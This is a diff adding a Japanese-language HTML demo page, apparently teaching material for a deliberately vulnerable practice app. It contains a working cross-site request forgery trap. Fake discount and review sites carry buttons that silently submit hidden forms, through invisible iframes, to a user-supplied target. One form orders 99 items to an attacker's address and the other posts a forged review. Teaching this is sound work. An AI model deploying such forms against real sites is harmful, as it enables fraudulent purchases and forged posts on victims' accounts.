@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang="jp">
+    <head>
+        <meta charset="utf-8">
+        <title>CSRF</title>
+        <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    </head>
+    <body>
+        <header>
+            <div class="title">
+                CSRF_TRAP
+            </div>
+        </header>
+        <main>
+            
+            <div class="content">
+                <h3>Target URL</h3>
+                ここにはCureVulnのブラウザに表示されているDemoブラウザのURLを挿入してください。
+                <input class="tsrget-url" id="targetUrl" name="targetUrl" type="text" name="" placeholder="http://< domain >"/>
+                <div class="button" id="setUrlButton" >set</div>
+            </div>
+            <div class="content">
+                <h3>購入処理</h3>
+                <p>ここでは購入処理でCSRFの脆弱性が存在する場合のデモを行います。</p>
+                罠サイトのデモ表示
+                <div class="trap">
+                    <div class="head">
+                        割引サイト waliby
+                    </div>
+                    <div class="app">
+                        <h2>ここから購入をすれば大幅割引!</h2>
+                        <div class="info">
+                            <h3>使い方</h3>
+                            このサイトで申し込む前に購入したいショップにLoginしよう！<br>
+                            <a href="" id="trapHref" class="trap-href" target="_blank">和菓子サイト　なごみ</a><br>
+                            <a href=""  class="trap-href" target="_blank">バイク屋 かわさき</a><br>
+                            <a href=""  class="trap-href" target="_blank">Amazoon.coom</a><br>
+                            <a href=""  class="trap-href" target="_blank">Rakkuten</a><br>
+                        </div>
+                        <h2>和菓子ショップ なごみ</h2>
+                        100円のたい焼きが何と！<br>
+                        <img id="trapImge1" src="" alt="" width="200px" height="200px">
+                        <h3 class="price"><s>100円</s>→<b class="price-big">50円</b></h3>
+                        <p>申し込みはこちら</p>
+                        <p id="messShopping"></p>
+                        <div class="shop-form">
+                            宛名 : <input type="text" class="text-box" name="addr" value=""> <br>
+                            宛先 : <input type="text" class="text-box" name="addr" value=""> <br>
+                            個数 : <input type="number" class="text-box" name="addr" value="" min="0" max="99" placeholder="0"> <br>
+                        </div>
+                        <div class="button">
+                            <p class="shop-button" id="buy">申し込み</p>
+                        </div>
+                        <form id="csrfFormShopping" action="" method="post" target="iframe_shopping">
+                            <input type="hidden" class="text-box" name="name" value="攻撃者に成功した男"> <br>
+                            <input type="hidden" class="text-box" name="addr" value="東京都 渋谷区 〇〇 〇丁目〇-〇〇"> <br>
+                            <input type="hidden" class="text-box" name="product_id" value="1" min="0" max="99" placeholder="0"> <br>
+                            <input type="hidden" class="text-box" name="num" value="99" min="0" max="99" placeholder="0"> <br>
+                        </form>
+                        <iframe name="iframe_shopping" style="width: 0px ;height: 0px;border: 0px;"></iframe>
+                    </div>
+                </div>
+                <h3>処理結果</h3>
+                <iframe id="shoppingIframe" src="" width="100%" height="1000px"></iframe>
+            </div>
+            <div class="content">
+                <h3>レビュー投稿処理</h3>
+                <div class="trap">
+                    <div class="head">
+                        みんなのレビュー広場
+                    </div>
+                    <div class="app">
+                        <h2>みんなでレビューを書いて割引券を入手しよう！!</h2>
+                        <div class="info">
+                            <h3>使い方</h3>
+                            このサイトで割引券を入手できるショップはこちら！<br>
+                            <a href="" id="trapHref" class="trap-href" target="_blank">和菓子サイト　なごみ</a><br>
+                            <a href=""  class="trap-href" target="_blank">バイク屋 かわさき</a><br>
+                            <a href=""  class="trap-href" target="_blank">Amazoon.coom</a><br>
+                            <a href=""  class="trap-href" target="_blank">Rakkuten</a><br>
+                            Loginしてからレビューを書こう！
+                        </div>
+                        <h2>和菓子ショップ なごみ</h2>
+                        100円のたい焼きが何と！<br>
+                        <img id="trapImge2" src="" alt="" width="200px" height="200px">
+                        <p>レビューを書こう！</p>
+                        <div class="shop-form">
+                            タイトル : <input type="text" class="text-box" name="addr" value=""> <br>
+                            本文<br>
+                            <textarea class="reviw" name="name" rows="8" cols="80"></textarea>
+                        </div>
+                        <p id=messReviw></p>
+                        <div class="button">
+                            <p class="shop-button" id="submitReviw">投稿</p>
+                        </div>
+                        <form id="csrfFormReviw" action="" method="post" target="iframe_reviw">
+                            <input type="hidden" class="text-box" name="title" value="攻撃できちゃいますね"> <br>
+                            <input type="hidden" class="text-box" name="review" value="ここに攻撃を埋め込んだり、犯罪予告も書きこめちゃうね"> <br>
+                            <input type="hidden" class="text-box" name="product_id" id=productIdReviw value="1" min="0" max="99" placeholder="0"> <br>
+                        </form>
+                        <iframe name="iframe_reviw" style="width: 0px ;height: 0px;border: 0px;"></iframe>
+                    </div>
+                </div>
+                <div class="setting">
+                    攻撃の際の設定<br>
+                    表示する表品番号 : <input class="productId" id="productId" type="number" value="0" placeholder="0" max="99" min="0">
+                </div>
+                <h3>処理結果</h3>
+                <iframe id="reviewIframe" src="" width="100%" height="1000px;"></iframe>
+            </div>
+        </main>
+        <footer>
+
+        </footer>
+    </body>
+</html>
+<script type="text/javascript">
+    /*
+    * 変数関連
+    */
+    var setUrlButton    = document.getElementById('setUrlButton');
+    var productId       = document.getElementById('productId');
+    var reviewIframe    = document.getElementById('reviewIframe');
+    var productId       = document.getElementById('productId');
+    var targetUrl       = document.getElementById('targetUrl');
+    var shoppingIframe  = document.getElementById('shoppingIframe');
+    var trapImge1       = document.getElementById('trapImge1');
+    var trapImge2       = document.getElementById('trapImge2');
+    var trapHref        = document.getElementById('trapHref');
+    var csrfFormShopping= document.getElementById('csrfFormShopping');
+    var csrfFormReviw   = document.getElementById('csrfFormReviw');
+    var buyButton       = document.getElementById('buy');
+    var submitReviw     = document.getElementById('submitReviw');
+    var formProductId   = document.getElementById('formProductId');
+    var messShopping    = document.getElementById('messShopping');
+    var messReviw       = document.getElementById('messReviw');
+    var productIdReviw  = document.getElementById('productIdReviw');
+
+    /*
+    * イベントハンドラ関連
+    */
+    setUrlButton.addEventListener("click",displaySetAllUrl);
+    submitReviw.addEventListener("click",csrfReview)
+    setUrlButton.addEventListener("click",displaySetAllUrl);
+    buy.addEventListener("click",buySubmit);
+    productId.addEventListener("change",displaySetReviw);
+    /*
+    * 関数関連
+    */
+    function displaySetAllUrl () {
+        displaySetReviw();
+        displaySetShop();
+        displaySetDemoCsrfShop();
+    }
+    function buySubmit (){
+        csrfFormShopping.submit();
+        messShopping.textContent = "購入に成功しました。お届けは3日後になります。";
+        displaySetShop();
+    }
+    function csrfReview () {
+        csrfFormReviw.submit();
+        messReviw.textContent = "レビュー投稿ありがとう！";
+        displaySetReviw();
+
+    }
+    function displaySetDemoCsrfShop () {
+        trapHref.href           = targetUrl.value;
+        csrfFormShopping.action = targetUrl.value+"/shopping.php";
+        csrfFormReviw.action    = targetUrl.value+"/comment.php";
+        trapImge1.src           = targetUrl.value+"/img/taiyaki.jpg";
+        trapImge2.src           = targetUrl.value+"/img/taiyaki.jpg";
+    }
+    function displaySetShop () {
+        shoppingIframe.src  = targetUrl.value+"/user.php";
+    }
+    function displaySetReviw () {
+        reviewIframe.src    = targetUrl.value+"/product.php?id="+productId.value;
+        csrfFormReviw.action    = targetUrl.value+"/comment.php";
+        productIdReviw.value    = productId.value;
+    }
+</script>
+<style media="screen">
+
+    body {
+        margin:0px;
+        padding:0px;
+    }
+    /*
+    * header CSS
+    */
+    header {
+        height: 70px;
+        background: #4e4e4e;
+        color: #fff;
+        box-shadow: 0 4px 20px 1px #cccccc;
+    }
+    .title {
+        font-size: 45px;
+        inline-size: 70px;
+        color: #fff;
+        padding-left: 10px;
+    }
+    /*
+    * main CSS
+    */
+    main {
+        width: 80%;
+        margin:auto;
+        justify-content: center;
+    }
+    .info {
+        width: 80%;
+        margin: auto;
+        border:solid 1px;
+        border-radius: 10px;
+        padding-bottom: 18px;
+    }
+    .head {
+        height: 50px;
+        font-size: 30px;
+        box-shadow: 0px 6px 0px 0px #0000001c;
+        line-height: 50px;
+        background-color: #006b2c;
+        color: #fff;
+    }
+    .trap{
+        background-color: #fff;
+        color: #000;
+        border: solid 2px;
+        /*height: 500px;
+        overflow: scroll;*/
+    }
+    .shop-button{
+        font-size: 20px;
+        cursor: pointer;
+
+        cursor: hand;
+    }
+    .reviw {
+        border-radius: 10px;
+    }
+    .shop-form{
+        font-size: 20px;
+        margin: 10px;
+    }
+    .text-box{
+        width: 300px;
+        height:20px;
+        border-radius: 10px;
+    }
+    .price {
+        color: red;
+    }
+    .price-big {
+        color: black;
+        font-size: 30px;
+        width: 100px;
+    }
+    .button{
+        background: #4e4e4e;
+        color: #fff;
+        border-radius: 10px;
+        width: 150px;
+        font-size: 30px;
+        margin: auto;
+        cursor: pointer;
+        cursor: hand;
+    }
+    .button:hover{
+        background: #2e2e2e;
+    }
+    .content {
+        width: 100%;
+        padding: 10px;
+        padding-top: 5px;
+        margin-top: 20px;
+        text-align: center;
+        background-color: #a2a2a2;
+        border-radius: 10px;
+        color: #fff;
+    }
+    .tsrget-url {
+        font-size: 30px;
+        color: #828282;
+        width: 60%;
+        margin-bottom:10px;
+    }
+    .productId {
+        font-size: 20px;
+        border-radius: 5px;
+    }
+    /*
+    * footer CSS
+    */
+    footer {
+
+    }
+</style>
